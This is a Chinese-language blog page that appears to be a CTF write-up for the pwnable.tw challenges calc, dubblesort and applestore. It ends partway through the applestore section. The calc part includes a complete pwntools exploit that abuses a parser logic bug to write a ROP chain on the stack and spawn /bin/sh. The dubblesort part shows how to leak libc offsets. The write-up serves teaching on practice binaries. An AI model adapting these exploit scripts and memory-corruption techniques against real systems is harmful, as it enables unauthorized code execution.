@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/a.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/a.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Consolas:300,300italic,400,400italic,700,700italic|隶书:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ll1ng.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="calc dubblesort applestore">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unpwnable( 01">
+<meta property="og:url" content="http://ll1ng.github.io/2021/08/10/unpwnable-01/index.html">
+<meta property="og:site_name" content="here&#39;s ling&#39;s blog">
+<meta property="og:description" content="calc dubblesort applestore">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/08/27/hcqWXSA7rpFtCVu.png">
+<meta property="article:published_time" content="2021-08-09T16:54:25.000Z">
+<meta property="article:modified_time" content="2021-08-27T15:19:17.112Z">
+<meta property="article:author" content="ling">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/08/27/hcqWXSA7rpFtCVu.png">
+
+<link rel="canonical" href="http://ll1ng.github.io/2021/08/10/unpwnable-01/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>unpwnable( 01 | here's ling's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="here's ling's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">here's ling's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">月が绮丽ですね</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">7</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://ll1ng.github.io/2021/08/10/unpwnable-01/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/%E7%A9%B9.jpg">
+      <meta itemprop="name" content="ling">
+      <meta itemprop="description" content="永远不要停止思考啊">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="here's ling's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          unpwnable( 01
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-10 00:54:25" itemprop="dateCreated datePublished" datetime="2021-08-10T00:54:25+08:00">2021-08-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-08-27 23:19:17" itemprop="dateModified" datetime="2021-08-27T23:19:17+08:00">2021-08-27</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>calc dubblesort applestore</p>
+<a id="more"></a>
+
+<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>逻辑漏洞造成可以泄露栈上内容以及写栈上返回地址</p>
+<p>程序实现了简单计算器的功能。主函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">calc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result[<span class="number">101</span>]; <span class="comment">// [esp+18h] [ebp-5A0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> expr[<span class="number">1024</span>]; <span class="comment">// [esp+1ACh] [ebp-40Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+5ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    bzero(expr, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !get_expr(expr, <span class="number">1024</span>) )                <span class="comment">// 过滤掉数字和+-*/%以外的字符</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    init_pool(result);                          <span class="comment">// 初始化存放数字的数组result</span></span><br><span class="line">    <span class="keyword">if</span> ( parse_expr(expr, result) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, result[result[<span class="number">0</span>]]);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中出现漏洞的函数是<code>parse_expr</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">parse_expr</span><span class="params">(<span class="keyword">char</span> *expr, <span class="keyword">int</span> *num_pool)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *old_opera_plus1; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> opera_start_idx; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *num_str; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> opera_pool[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  old_opera_plus1 = expr;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  bzero(opera_pool, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( opera_start_idx = <span class="number">0</span>; ; ++opera_start_idx )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( expr[opera_start_idx] - (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">'0'</span> &gt; <span class="number">9</span> )<span class="comment">// operator</span></span><br><span class="line">    &#123;</span><br><span class="line">      len = &amp;expr[opera_start_idx] - old_opera_plus1;<span class="comment">//数字字符串长度，old_opera_plus1即数字字符串起始位置</span></span><br><span class="line">      num_str = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(len + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(num_str, old_opera_plus1, len);</span><br><span class="line">      num_str[len] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(num_str, <span class="string">"0"</span>) )              <span class="comment">// after operator can't be 0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"prevent division by zero"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      num = atoi(num_str);</span><br><span class="line">      <span class="keyword">if</span> ( num &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = (*num_pool)++;           <span class="comment">//num_pool[0]存放的是数字个数</span></span><br><span class="line">        num_pool[v3 + <span class="number">1</span>] = num;       <span class="comment">//在之前个数+1的位置放入当前数字</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( expr[opera_start_idx] &amp;&amp; expr[opera_start_idx + <span class="number">1</span>] - (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">'0'</span> &gt; <span class="number">9</span> )<span class="comment">// opera+1-&gt;opera 避免了出现连续出现运算符或运算符后没有数的情况</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"expression error!"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      old_opera_plus1 = &amp;expr[opera_start_idx + <span class="number">1</span>];</span><br><span class="line">      <span class="keyword">if</span> ( opera_pool[v6] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( expr[opera_start_idx] )        </span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'%'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">            <span class="keyword">if</span> ( opera_pool[v6] != <span class="string">'+'</span> &amp;&amp; opera_pool[v6] != <span class="string">'-'</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">            opera_pool[++v6] = expr[opera_start_idx];   <span class="comment">// 前一个运算符是+-就先存下来</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">LABEL_14:</span><br><span class="line">            eval(num_pool, opera_pool[v6]);     <span class="comment">// 前一个运算符为*/%直接算</span></span><br><span class="line">            opera_pool[v6] = expr[opera_start_idx];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(num_pool, opera_pool[v6--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        opera_pool[v6] = expr[opera_start_idx];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !expr[opera_start_idx] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &gt;= <span class="number">0</span> )</span><br><span class="line">    eval(num_pool, opera_pool[v6--]);<span class="comment">//把留下来的+-计算完</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​         <code>eval</code>的内容就是将<code>num_pool</code>的倒数两个数用<code>operator</code>计算一下存入倒数第二个数的位置并将<code>num_pool[0]</code>减一。</p>
+<p>​        其中有一句<code>if ( expr[opera_start_idx] - (unsigned int)&#39;0&#39; &gt; 9 )// operator or \0</code>  不同类型进行运算时进行转换符合一套规则，完整可见《c++ primer plus》中文第六版p64。在这个表达式中两个操作数一个有符号，另一个无符号，无和有的级别相同，且有不能表示无的所有可能取值，前7条均不符合，故符合的应该是（8）将两个操作数都转换为有符号类型的无符号版本。</p>
+<p>​      现在考虑有哪些没被排除的非法输入。（草其实我自己看是看不出来哪有问题的……）元素有两个，运算符和数。在对<code>num_pool</code>计算时将数的个数放在0的位置，可能导致个数被当成操作数进行计算。那么如何达成错开一个数的效果呢？可以考虑比一般情况少输入一个数。发现第一个元素为运算符的情况程序没有考虑。</p>
+<p>​      输入+n时，第一次循环检测到+将+存入<code>opera_pool</code>，第二次将n存入<code>num_pool</code>[1,n]，计算结果<code>num_pool</code>[n+1,n]-&gt;[n,n]，返回``result[result[0]]=num_pool[n]`，我们可以用这个思路来泄露任意偏移栈上的内容。`````````</p>
+<p>​      而输入+x+n（x不为1）计算的结果都将是n。比如输入+10+1后按照程序逻辑，第一次循环检测到运算符+，将+存入<code>opera_pool</code>；第二次循环检测到第二个+，将x存入<code>num_pool</code>  [1,10]，再将+存入<code>opera_pool</code>，进入<code>eval</code>后<code>num_pool</code>变为[11,10]-&gt;[10,10]；进入第三次循环检测到结尾的<code>\0</code>，将n存入<code>num_pool</code>，此时<code>num_pool[11]</code>=1，再进行计算，<code>num_pool[10]=num_pool[10]+num_pool[11]=1</code>。而此时<code>opera_pool</code>已经为空了所以返回了<code>result[result[0]]=num_pool[10]=1</code>。利用这个思路达到任意偏移写。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>​      静态编译，考虑构造11号系统调用。（条件我还不知道是从哪来的…）粘自网络：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eax &#x3D; 11</span><br><span class="line">ebx &#x3D; addr(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line">ecx &#x3D; 0</span><br><span class="line">edx &#x3D; 0</span><br></pre></td></tr></table></figure>
+
+<p>​      由<code>int result[101]; // [esp+18h] [ebp-5A0h] BYREF</code>，<code>0x5a0/4=360</code>，我们得到了栈的基址即得到了写入<code>/bin/sh</code>的地址。查找rop链控制参数即可。写的时候注意两个地方，一个是栈上原有的数据可能干扰写入，一个是不能直接把0写进去，只要0在运算符后都被判<code>invalid</code>。我的处理办法是先从高地址往低写1，需要0时第二个运算符换成-就得到了0。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *;<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">name=<span class="string">'./calc'</span></span><br><span class="line">f=ELF(name)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    p=remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10100</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment">#p = process(['./ld',name],env=&#123;'LD_PRELOAD':'./_libc.so.6'&#125;)</span></span><br><span class="line">    p=process(name)</span><br><span class="line"><span class="comment">#context(os='linux',arch='amd64',log_level='debug')</span></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment">#context.terminal = ['tmux' , 'splitw' , '-h']</span></span><br><span class="line">one=[<span class="number">0x4527a</span>,<span class="number">0x45226</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num          :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">l	= <span class="keyword">lambda</span> x		:log.success(x)</span><br><span class="line">dbg = <span class="keyword">lambda</span> :    gdb.attach(p,<span class="string">"b *0x80493f2"</span>) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pa</span><span class="params">(i,num)</span>:</span></span><br><span class="line">    sl(<span class="string">'+'</span>+str(<span class="number">360</span>+i)+<span class="string">'+'</span>+str(num))</span><br><span class="line"></span><br><span class="line">eax=<span class="number">0x0805c34b</span></span><br><span class="line">edx_c_b=<span class="number">0x080701d0</span></span><br><span class="line">ecx_b=<span class="number">0x080701d1</span></span><br><span class="line">ebx_esi=<span class="number">0x0804a094</span></span><br><span class="line"></span><br><span class="line">int_80=<span class="number">0x08049a21</span></span><br><span class="line">sla(<span class="string">'===\n'</span>,flat(<span class="string">'+'</span>,<span class="string">'360'</span>))</span><br><span class="line">ebp=int(ru(<span class="string">'\n'</span>,drop=<span class="literal">True</span>))+<span class="number">0xffffffff</span>+<span class="number">1</span><span class="number">-0x20</span></span><br><span class="line">log.info(<span class="string">"ebp:"</span>+hex(ebp))</span><br><span class="line">log.info(<span class="string">'num_pool:'</span>+hex(ebp<span class="number">-0x5a0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    pa(i,<span class="number">1</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">pa(<span class="number">12</span>+<span class="number">2</span>,<span class="number">0x68732f</span>)</span><br><span class="line">pa(<span class="number">11</span>+<span class="number">2</span>,<span class="number">0x6e69622f</span>)</span><br><span class="line">pa(<span class="number">10</span>+<span class="number">2</span>,int_80)</span><br><span class="line">sl(<span class="string">'+371-'</span>+str(<span class="number">0xffffffff</span>-ebp<span class="number">-46</span><span class="number">-8</span>))</span><br><span class="line">pa(<span class="number">7</span>+<span class="number">2</span>,ebx_esi)</span><br><span class="line">sl(<span class="string">'+368-'</span>+str(<span class="number">1</span>))</span><br><span class="line">pa(<span class="number">4</span>+<span class="number">2</span>,ecx_b)</span><br><span class="line">sl(<span class="string">'+364-'</span>+str(<span class="number">1</span>))</span><br><span class="line">pa(<span class="number">0</span>+<span class="number">2</span>,edx_c_b)</span><br><span class="line">pa(<span class="number">1</span>,<span class="number">11</span>)</span><br><span class="line">pa(<span class="number">0</span>,eax)</span><br><span class="line">sl(<span class="string">'a'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="dubblesort"><a href="#dubblesort" class="headerlink" title="dubblesort"></a>dubblesort</h2><p>​      接收字符串打印并往栈上写东西。打印时用的是<code>printf</code>，遇到<code>\0</code>截断，考虑覆盖栈上内容带出来<code>libc</code>有关的内容。写的时候因为会对输入内容排序记得保证值不减小。这个地方的找偏移我长了点见识。</p>
+<p>​      输入以后看栈上内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ tel 0xffba6b9c</span><br><span class="line">0000| 0xffba6b9c (&#39;a&#39; &lt;repeats 23 times&gt;, &quot;\n&quot;)</span><br><span class="line">0004| 0xffba6ba0 (&#39;a&#39; &lt;repeats 19 times&gt;, &quot;\n&quot;)</span><br><span class="line">0008| 0xffba6ba4 (&#39;a&#39; &lt;repeats 15 times&gt;, &quot;\n&quot;)</span><br><span class="line">0012| 0xffba6ba8 (&#39;a&#39; &lt;repeats 11 times&gt;, &quot;\n&quot;)</span><br><span class="line">0016| 0xffba6bac (&quot;aaaaaaa\n&quot;)</span><br><span class="line">0020| 0xffba6bb0 (&quot;aaa\n&quot;)</span><br><span class="line">0024| 0xffba6bb4 --&gt; 0xf7f3e000 --&gt; 0x1b2db0 </span><br><span class="line">0028| 0xffba6bb8 --&gt; 0xf7f3c244 --&gt; 0xf7da3030 (&lt;_IO_check_libio&gt;:	)</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
+
+<p>​      以0x28处的值为例。本地中它相对于<code>libc</code>的偏移为0x1b1244，执行<code>readelf -S /lib/i386-linux-gnu/libc-2.23.so</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">[24] .tbss             NOBITS          001b1244 1b0244 000040 00 WAT  0   0  4</span><br></pre></td></tr></table></figure>
+
+<p>​      于是对应到给的<code>libc</code>找出该段偏移。（啊不太懂为什么看Addr而不是Off）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[23] .tbss             NOBITS          001ae244 1ad244 000040 00 WAT  0   0  4</span><br></pre></td></tr></table></figure>
+
+<h2 id="applestore"><a href="#applestore" class="headerlink" title="applestore"></a>applestore</h2><p>​      在<code>ida</code>里<code>view-&gt;open subviews-&gt;local types</code>，按下<code>insert</code>可以用C语言直接声明结构体，在变量处右键转换为结构体指针格式后整理出来的代码看着还是挺爽的。</p>
+<img src="https://i.loli.net/2021/08/27/hcqWXSA7rpFtCVu.png" alt="image-20210827195805095.png" style="zoom:60%;" />
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%d: Apple Store\n"</span>, <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d: Add into your shopping cart\n"</span>, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d: Remove from your shopping cart\n"</span>, <span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d: List your shopping cart\n"</span>, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d: Checkout\n"</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"%d: Exit\n"</span>, <span class="number">6</span>);</span><br></pre></td></tr></table></figure>
+<p>​        4个功能，（2）用<code>malloc</code>创建链表结点（3）删除结点（用的是<code>unlink</code>那一套（4）链表遍历打印购物车（5）结账。结账代码：</p>
